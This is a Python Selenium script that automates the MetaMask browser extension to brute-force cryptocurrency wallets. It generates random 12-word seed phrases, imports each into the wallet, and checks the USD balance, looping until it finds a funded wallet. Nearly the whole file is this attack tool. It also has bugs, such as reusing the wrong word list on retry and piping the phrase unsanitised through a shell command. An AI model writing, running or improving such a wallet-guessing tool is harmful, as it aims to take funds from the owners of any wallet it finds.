from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
import random
import hashlib
import os
import subprocess
import time
def copy2clip(txt):
    cmd = 'echo ' + txt + '| clip'
    return subprocess.check_call(cmd, shell=True)
def read_word_list(file):
    try:
        with open(file, 'r') as f:
            word_list = [line.strip() for line in f]
        return word_list
    except:
        return []
def find_position(word_list, word):
    try:
        position = word_list.index(word)
        return position
    except ValueError:
        return None
def to_11bit_binary(position):
    return format(position, '011b') if position is not None else None
def generate_random_7bit_sequence():
    return format(random.randint(0, 127), '07b')
def binary_to_byte_string(binary_str):
    padded_binary_str = binary_str.zfill(len(binary_str) + (8 - len(binary_str) % 8) % 8)
    byte_string = bytes(int(padded_binary_str[i:i+8], 2) for i in range(0, len(padded_binary_str), 8))
    return byte_string
def hash_sha256(byte_string):
    return hashlib.sha256(byte_string).hexdigest()
def hex_char_to_4bit(hex_char):
    return format(int(hex_char, 16), '04b')
def binary_to_decimal(binary_str):
    return int(binary_str, 2)
def get_word_from_position(word_list, decimal_value):
    return word_list[decimal_value % len(word_list)]
def generate_seed_phrase(word_list):
    random_words = random.sample(word_list, 11)
    binary_positions = "".join(to_11bit_binary(find_position(word_list, word)) or "00000000000" for word in random_words)
    random_7bit = generate_random_7bit_sequence()
    sha256_hash = hash_sha256(binary_to_byte_string(binary_positions))
    combined_7_and_4bit = random_7bit + hex_char_to_4bit(sha256_hash[0])
    decimal_value = binary_to_decimal(combined_7_and_4bit)
    final_word = get_word_from_position(word_list, decimal_value)
    return random_words + [final_word]
EXTENSION_PATH = "C:/Users/ZAYDS/AppData/Local/Google/Chrome/User Data/Default/Extensions/nkbihfbeogaeaoehlefnkodbefgpgknn/12.6.0_0.crx"
opt = webdriver.ChromeOptions()
opt.add_extension(EXTENSION_PATH)
driver = webdriver.Chrome(options=opt)
password=12345678
time.sleep(25)
driver.switch_to.window(driver.window_handles[1]) 
driver.find_element(By.XPATH, '//*[@id="onboarding__terms-checkbox"]').click()
time.sleep(1)
driver.find_element(By.XPATH, '/html/body/div[1]/div/div[2]/div/div/div/ul/li[3]/button').click()
time.sleep(1)
driver.find_element(By.XPATH, '/html/body/div[1]/div/div[2]/div/div/div/div[2]/button[2]').click()
time.sleep(1)
word_file = 'words.txt'
word_list = read_word_list(word_file)
if word_list:
    success = False
    while not success:
        final_word_list = generate_seed_phrase(word_list)
        seed_phrase = " ".join(final_word_list)
        copy2clip(seed_phrase)
        print("Trying seed phrase:", seed_phrase)
        input_field = driver.find_element(By.XPATH, '/html/body/div[1]/div/div[2]/div/div/div/div[4]/div/div/div[3]/div[1]/div[1]/div/input')
        input_field.send_keys(Keys.CONTROL + 'v')
        time.sleep(0.5)
        invalid_element = driver.find_elements(By.XPATH, '/html/body/div[1]/div/div[2]/div/div/div/div[4]/div/div/div[4]')
        if invalid_element:
            print("Seed phrase is invalid. Generating a new one...")
            final_word_list2 = generate_seed_phrase(word_list)
            seed_phrase2 = " ".join(final_word_list)
            copy2clip(seed_phrase2)
        else:
            print("Seed phrase accepted.")
            success = True
            driver.find_element(by=By.XPATH, value='/html/body/div[1]/div/div[2]/div/div/div/div[4]/div/button' ).click()
            driver.find_element(by = By.XPATH, value = '/html/body/div[1]/div/div[2]/div/div/div/div[2]/form/div[1]/label/input').send_keys(password) #enter pass
            driver.find_element(by = By.XPATH, value = '/html/body/div[1]/div/div[2]/div/div/div/div[2]/form/div[2]/label/input').send_keys(password) #enter pass2
            driver.find_element(by=By.XPATH, value='/html/body/div[1]/div/div[2]/div/div/div/div[2]/form/div[3]/label/span[1]/input').click()
            driver.find_element(by=By.XPATH, value='/html/body/div[1]/div/div[2]/div/div/div/div[2]/form/button').click()
            time.sleep(3)
            driver.find_element(By.CSS_SELECTOR, "button.mm-button-primary").click()
            driver.find_element(by=By.XPATH, value='/html/body/div[1]/div/div[2]/div/div/div/div[2]/button').click()
            time.sleep(3)
            driver.find_element(by=By.XPATH, value='/html/body/div[1]/div/div[2]/div/div/div/div[2]/button').click()
            time.sleep(3)
            elem=driver.find_element(by=By.XPATH, value='/html/body/div[1]/div/div[3]/div/div/div/div[1]/div/div[1]/div/div/div/div[1]/div/span[1]')
            usd = float(elem.text[1:])
            print(usd)
if usd == 0:
    success2 = False
    time.sleep(5)
    while not success2:
        time.sleep(8)
        driver.get("chrome-extension://nkbihfbeogaeaoehlefnkodbefgpgknn/home.html#restore-vault")   
        time.sleep(1)
        final_word_list3 = generate_seed_phrase(word_list)
        seed_phrase3 = " ".join(final_word_list3)
        copy2clip(seed_phrase3)
        print("Generated seed phrase:", seed_phrase3)
        input_field = driver.find_element(By.XPATH, '/html/body/div[1]/div/div[3]/div/div/div/form/div[1]/div[3]/div[1]/div[1]/div/input')
        input_field.send_keys(Keys.CONTROL + 'v')
        invalid_element = driver.find_elements(By.XPATH, '/html/body/div[1]/div/div[3]/div/div/div/form/div[1]/div[4]')
        if invalid_element:
            print("Seed phrase is invalid. Generating a new one...")
        else:
            print("Seed phrase accepted, proceeding...")
            success2 = True
            driver.find_element(by=By.XPATH, value='/html/body/div[1]/div/div[3]/div/div/div/form/div[2]/div[1]/div/input').send_keys(password)
            driver.find_element(by=By.XPATH, value='/html/body/div[1]/div/div[3]/div/div/div/form/div[2]/div[2]/div/input').send_keys(password)
            driver.find_element(by=By.XPATH, value='/html/body/div[1]/div/div[3]/div/div/div/form/button').click()
            time.sleep(25)
            elem = driver.find_element(by=By.XPATH, value='/html/body/div[1]/div/div[3]/div/div/div/div[1]/div/div[1]/div/div/div/div[1]/div/span[1]')
            usd = float(elem.text[1:])
            print("USD:", usd)
            if usd == 0:
                print("USD is 0, restarting the process...")
                success2 = False
            else:
                success2 = True
                print("Seed phrase:", seed_phrase3, "USD:", usd)
else:
    print("Seed phrase:", seed_phrase, "USD:", usd)
time.sleep(1200)

